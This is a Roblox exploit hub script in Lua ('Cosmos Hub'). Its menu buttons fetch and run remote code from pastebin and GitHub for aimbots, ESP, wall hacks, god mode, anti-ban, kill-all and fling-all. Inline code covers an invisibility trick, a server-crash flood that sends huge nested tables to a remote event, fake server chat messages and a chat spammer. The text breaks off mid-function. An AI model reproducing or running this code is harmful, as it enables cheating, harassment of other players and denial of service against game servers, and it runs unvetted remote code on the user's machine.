-- RGB Cosmos Hub
-- Made by Cosmos#6567

local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/VL"))()
local s = VLib:Window("Cosmos Hub", "Multi Exploit", "CMS")
local ss = s:Tab("Main")
ss:Label("- -Aimbot- -")
ss:Button("Aimbot V1",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script%20(Without%20FOV).lua", true))()
end)
ss:Button("Aimbot V2",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script.lua", true))()
end)
ss:Button("Silent Aim",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Averiias/Universal-SilentAim/main/main.lua"))()
end)
ss:Button("Wall Hack",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Wall-Hack/main/Resources/Scripts/Main.lua", true))()
end)
ss:Label("- -Tracking Section- -")
ss:Button("ESP",function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
end)
ss:Button("Charms",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/eH39iKSg")))
end)
ss:Button("X-Ray (Press X)",function()
loadstring(game:HttpGet("https://pastebin.com/raw/vNpnSDCz", true))()
end)
ss:Button("Reach",function()
loadstring(game:HttpGet("https://pastebin.com/raw/tsbVWZdP", true))()
end)
ss:Button("Server Finder",function()
loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
end)
ss:Label("- -B-Tools Section- -")
ss:Button("B-Tools V1",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/scripts/main/Btools.lua', true))() 
end)
ss:Button("B-Tools V2",function()
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4 
end)
ss:Label("- -Studio Editor Section- -")
ss:Button("DarkDexV3",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/DarkDexV3.lua"))(); 
end)
local ss = s:Tab("Player")
ss:Label("- -Player Section- -")
ss:Button("Fly (Press C)",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/ReJ0TXqg")))
end)
ss:Button("Invisible (Press E)",function()
--[[Invisibility Toggle

You can find the orginal concept here: https://v3rmillion.net/showthread.php?tid=544634

This method clones the character locally, teleports the real character to a safe location, then sets the character to the clone.
Basically, your real character is in the sky while you are on the ground.


Because of the way this works, games with a decent anti-cheat will fuck this up.
If you turn it off, you have to go to a safe place before going invisible.

Written by: BitingTheDust ; https://v3rmillion.net/member.php?action=profile&uid=1628149
]]
--Settings:
local ScriptStarted = false
local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.

local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()

local IsInvisible = false

RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid

  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)

PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end

      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
     
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
     
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end

game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
end)
ss:Button("Walk On Walls",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/walk-walls/main/README.md", true))()
end)
ss:Button("No Clip (Press B)",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/kt3Nxzw1")))
end)
ss:Button("Anti-Fling",function()
-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)
ss:Button("Anti-Kick",function()
loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
end)
ss:Button("Anti-Ban",function()
loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
end)
ss:Label("- -Teleportation Section- -")
ss:Button("Click TP",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/njMw0Bke")))
end)
ss:Button("Player TP",function()
loadstring(game:HttpGet("https://pastebin.com/raw/EBhdqeWb", true))()
end)
ss:Label("- -Movement Section- -")
ss:Button("Shift Run",function()
repeat wait() until game.Players.LocalPlayer 
m = game.Players.LocalPlayer:GetMouse() 
m.KeyDown:connect(function(key)
 if key == "0" then --"Shift to run" 0 == shift
  print("Running")
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 60
 end
end) 
m.KeyUp:connect(function(key)
 if key == "0" then
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end
end)
end)
ss:Button("High Jump",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/0JgQ1hJy")))
end)
ss:Button("Infinite Jump (Press V)",function()
pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd"))) 
end)
ss:Button("Front/Back Flips (Press Z,X,C)",function()
wait(5)
local ver = "2.00"
local scriptname = "feFlip"
local FrontflipKey = Enum.KeyCode.Z
local BackflipKey = Enum.KeyCode.X
local AirjumpKey = Enum.KeyCode.C
local ca = game:GetService("ContextActionService")
local zeezy = game:GetService("Players").LocalPlayer
local h = 0.0174533
local antigrav
function zeezyFrontflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do 
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end
function zeezyBackflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end
function zeezyAirjump(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
		wait()
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
	end
end
ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)
print(scriptname .. " " .. ver .. " loaded successfully")
print("made by Zeezy#7203")
local notifSound = Instance.new("Sound",workspace)
notifSound.PlaybackSpeed = 1.5
notifSound.Volume = 0.15
notifSound.SoundId = "rbxassetid://170765130"
notifSound.PlayOnRemove = true
notifSound:Destroy()
game.StarterGui:SetCore("SendNotification", {Title = "feFlip", Text = "feFlip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
end)
ss:Button("Animations",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Luciquad/bweq42/main/cheatersoulanimationchanger.lua'))()
    end)
ss:Slider("Walk Speed",0,1000,16,function(t)
print(t)
end)
ss:Slider("Jump Power",0,1000,50,function(t)
print(t)
end)
ss:Label("- -Visual Section- -")
ss:Button("Hide Name",function()
plr = game.Players.LocalPlayer
while true do wait(0.1)
game.Workspace:WaitForChild(plr)
local g = game.Workspace[plr]:FindFirstChild("mask")
if g then else wait(0.4)
local args = {
[1] = "EquipArata"
}
game:GetService("ReplicatedStorage").Events.RemoteEvent:FireServer(unpack(args))
end
end
end)
ss:Button("Headless",function()
    local lp = game:GetService "Players".LocalPlayer
if lp.Character:FindFirstChild "Head" then
    local char = lp.Character
    char.Archivable = true
    local new = char:Clone()
    new.Parent = workspace
    lp.Character = new
    wait(2)
    local oldhum = char:FindFirstChildWhichIsA "Humanoid"
    local newhum = oldhum:Clone()
    newhum.Parent = char
    newhum.RequiresNeck = false
    oldhum.Parent = nil
    wait(2)
    lp.Character = char
    new:Destroy()
    wait(1)
    newhum:GetPropertyChangedSignal("Health"):Connect(
        function()
            if newhum.Health <= 0 then
                oldhum.Parent = lp.Character
                wait(1)
                oldhum:Destroy()
            end
        end)
    workspace.CurrentCamera.CameraSubject = char
    if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(.1)
        char.Animate.Disabled = false
    end
    lp.Character:FindFirstChild "Head":Destroy()
end
end)
ss:Button("Korblox",function()
local char = game:GetService("Players").LocalPlayer.Character
-- RIGHT LEG
char.RightFoot.MeshId = "http://www.roblox.com/asset/?id=902942089"
char.RightFoot.Transparency = 1
char.RightLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942093"
char.RightLowerLeg.Transparency = 1
char.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
char.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
end)
ss:Button("Rainbow Cape",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/yzUss77V", true))()
end)
ss:Button("Flying Orb",function()
    loadstring(game:GetObjects("rbxassetid://142257690")[1].Source)()
end)
ss:Button("Force Field",function()
print("Pressed!")
end)
local ss = s:Tab("All Tools")
ss:Label("- -Here Are All The Tools We Have- -")
ss:Label("- -Some Might Not Work- -")
ss:Button("Rejoin",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
end)
ss:Button("Save Game",function()
    saveinstance()
end)
ss:Button("Auto Clicker",function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
end)
ss:Button("Charms",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/eH39iKSg")))
end)
ss:Button("Ctrl Delete",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/KGYKmYtW")))
end)
ss:Button("ESP",function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
end)
ss:Button("Fly V1 (Press C)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/ReJ0TXqg")))
end)
ss:Button("Fly V2 (Press E)",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/jebnPDXh", true))()
end)
ss:Button("FOV",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/PRw16c2Y")))
end)
ss:Button("God Mode",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FwfNEqYz", true))()
end)
ss:Button("Gravity",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/0JgQ1hJy")))
end)
ss:Button("Infinite Jump (Press V)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd")))
end)
ss:Button("Invisible God Mode",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/HMcCQbpk", true))()
end)
ss:Button("Less Lag",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/eHEfAR8z", true))()
end)
ss:Button("Noclip (Press B)",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/kt3Nxzw1")))
end)
ss:Button("Reset",function()
    game.Players.LocalPlayer:GetMouse().KeyUp:connect(function(key)
    if key == "r"  then
        game.Players.LocalPlayer.character:WaitForChild("Humanoid").Health = 0
    end  
end)
end)
ss:Button("Shift Run",function()
    repeat wait() until game.Players.LocalPlayer
m = game.Players.LocalPlayer:GetMouse()
m.KeyDown:connect(function(key)
 if key == "0" then --"Shift to run" 0 == shift
  print("Running")
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 70
 end
end)
m.KeyUp:connect(function(key)
 if key == "0" then
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end
end)
end)
ss:Button("TP Tool",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/njMw0Bke")))
end)
ss:Button("X-Ray (Press X)",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vNpnSDCz", true))()
end)
ss:Button("Anti AFK",function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/dnwYtGCQ")))
end)
ss:Button("B-Tools V1",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/scripts/main/Btools.lua', true))()
end)
ss:Button("B-Tools V2",function()
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
end)
ss:Button("RTX",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zxV27xHc", true))()
end)
ss:Button("Spectate",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/WgpJfMGS", true))()
end)
ss:Button("TP Gui",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/EBhdqeWb", true))()
end)
ss:Button("Reach Gui",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tsbVWZdP", true))()
end)
ss:Button("Mute Boombox",function()
    while wait(1) do
for i,v in pairs(game:GetDescendants()) do
if v.Name == "BoomBox" then v:Destroy() end
end
end
end)
ss:Button("Draw",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1322re6a", true))()
end)
ss:Button("Rainbow Username",function()
    p = game.Players.LocalPlayer p.Neutral = false while wait() do p.TeamColor = BrickColor.Random() end
end)
local ss = s:Tab("Admin")
ss:Label("- -OP Stuff- -")
ss:Button("CMD-X Admin Commands",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
end)
ss:Button("Infinite Yield Admin Commands",function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)
ss:Button("Fates Admin Commands",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
end)
ss:Button("God Mode",function()
loadstring(game:HttpGet("https://pastebin.com/raw/FwfNEqYz", true))()
end)
ss:Button("Invisible God Mode",function()
loadstring(game:HttpGet("https://pastebin.com/raw/HMcCQbpk", true))()
end)
ss:Button("Roblox Studio Editor",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/DarkDexV3.lua"))();
end)
local ss = s:Tab("Trolling")
ss:Label("- -All Players- -")
ss:Button("Kill All",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Kill%20All'))()
end)
ss:Button("Fling All",function()
    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
end)
ss:Button("Noclip fling All",function()
    Target = "name" -- target name, can be shortened
flinghh = 1000 -- what to set your hipheight to while flinging
loadstring(game:HttpGet("https://xn--9p9haaaaaa.tk/scripts/CarpetFling.lua"))()
end)
ss:Button("Bring All",function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Bring%20All'))()
end)
ss:Label("- -Guns- -")
ss:Button("Pistol",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/SeRxrgci", true))()
end)
ss:Button("AK-47",function()
    game:GetObjects("rbxassetid://149948769")[1].Parent=game.Players.LocalPlayer.Backpack
end)
ss:Button("Telekinisis Gun (Press C)",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/fauftxLe", true))()
end)
ss:Label("- -Swords- -")
ss:Button("Huge Sword",function()
    game:GetObjects("rbxassetid://169934427")[1].Parent=game.Players.LocalPlayer.Backpack
end)
ss:Button("6 Swords",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/80juE2kw", true))()
end)
ss:Button("Purple Swords",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/80juE2kw", true))()
end)
ss:Label("- -Chat- -")
ss:Button("Chat Spoofer",function()
    loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
end)
ss:Button("Server Message",function()
    player =  "Server"
fakemsg = "Welcome Admin (c00lkidd) joined"
message = "Hi                                                                                                                                                            ["..tostring(player).."]: "..tostring(fakemsg)
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
end)
ss:Button("Insult Bypass",function()
    loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)
ss:Button("Chat Translator",function()
    loadstring(game:HttpGetAsync('https://i.qts.life/r/ChatInlineTranslator.lua', true))()
end)
ss:Button("Chat Remover",function()
    while true do
    wait(1.7)
local args = {
    [1] = " ",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end
end)
ss:Button("Chat Spammer",function()
    while true do wait(0) 

        local A_1 = "JOIN COSMOS HUB TODAY - MADE BY COSMOS" local A_2 = "All" 
        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) end
end)
ss:Label("- -Broken Stuff- -")
ss:Button("Mouse Fling (Press E)",function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/mouse-fling/main/README.md", true))()
end)
ss:Button("Crash Server",function()
    --// made my reestart
--// fixed by daddy ewo
while wait(0.6) do --// don't change it's the best
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
    local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then
    return nil
    end
    local calculateperfectval = (mainvalueifonetable/(val+2))
    return calculateperfectval
    end
    local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    z = spammedtable[1]
    for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
    end
    local calculatemax = getmaxvalue(tableincrease)
    local maximum
    if calculatemax then
    maximum = calculatemax
    else
    maximum = 999999
    end
    for i = 1, maximum do
    table.insert(maintable, spammedtable)
    end
    for i = 1, tries do
    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
    end
    end
    bomb(250, 2) --// change values if client crashes
    end
end)
ss:Button("Void Spin",function() 
power = 500 -- change this to make it more or less powerful
game:GetService('RunService').Stepped:connect(function()
game.Players.LocalPlayer.Character.Head.CanCollide = false
game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false
game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false
game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
end)
wait(.1)
local bambam = Instance.new("BodyThrust")
bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
bambam.Force = Vector3.new(power,0,power)
bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end)
ss:Button("Freeze Time (Left Ctrl)",function()
    _G.key = Enum.KeyCode.LeftControl
loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()
setting = settings().Network
local Effect = Instance.new("ColorCorrectionEffect")
Effect.Parent = game.Lighting
Effect.Saturation = -1 
Effect.Contrast = 0
toggle = false
Effect.Enabled = false
function onKeyPress(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.RightControl then	
		if toggle == false then
			setting.IncomingReplicationLag = 1000
			Effect.Enabled = true
			toggle = true
		else
			setting.IncomingReplicationLag = 0
			Effect.Enabled = false
			toggle = false
		end
 
	end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)
game:GetService("UserInputService").InputBegan:connect(onKeyPress) 
end)
ss:Button("OOF Spam",function()
    _G.enabled = true -- Re-execute to turn off
_G.speed = 110 -- Keep around 100 or it wont play
local RunService = game:GetService("RunService");
local Players = game:GetService("Players");
local LocalPlayer = game:GetService("Players").LocalPlayer;
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
local Humanoid = Character:WaitForChild("Humanoid") or Character:FindFirstChildOfClass("Humanoid");
local HRP = Humanoid.RootPart or Humanoid:FindFirstChild("HumanoidRootPart")
if not Humanoid or not _G.enabled then
   if Humanoid and Humanoid.Health <= 0 then
       Humanoid:Destroy()
   end
   return
end
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
Humanoid.BreakJointsOnDeath = false
Humanoid.RequiresNeck = false
local con; con = RunService.Stepped:Connect(function()
   if not Humanoid then return con:Disconnect() end
   Humanoid:ChangeState(Enum.HumanoidStateType.Running)  -- Change state so not die
end)
LocalPlayer.Character = nil
LocalPlayer.Character = Character
task.wait(Players.RespawnTime + 0.1)
while task.wait(1/_G.speed) do
   Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
end
end)
ss:Button("Clones",function()
    loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)() 
end)
ss:Button("Draw",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1322re6a", true))() 
end)
ss:Button("Air Swim",function()
    local cmdlp = game:GetService("Players").LocalPlayer
workspace.Gravity = 100
cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false) cmdlp.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false) cmdlp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
end)
ss:Label("- -Avatar Forms- -")
ss:Button("AMOGUS (Press Q,C,F)",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/UpHhv7Jg", true))()
end)
ss:Button("Heavenus (Press Q,E,R)",function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
end)
ss:Button("Green Goku Form",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/UpHhv7Jg", true))()
end)
ss:Button("OP Titan Form",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/neCAa9AB", true))()
end)
ss:Button("Titan Form",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZmySaMrb", true))()
end)
ss:Button("Assasin Form",function()
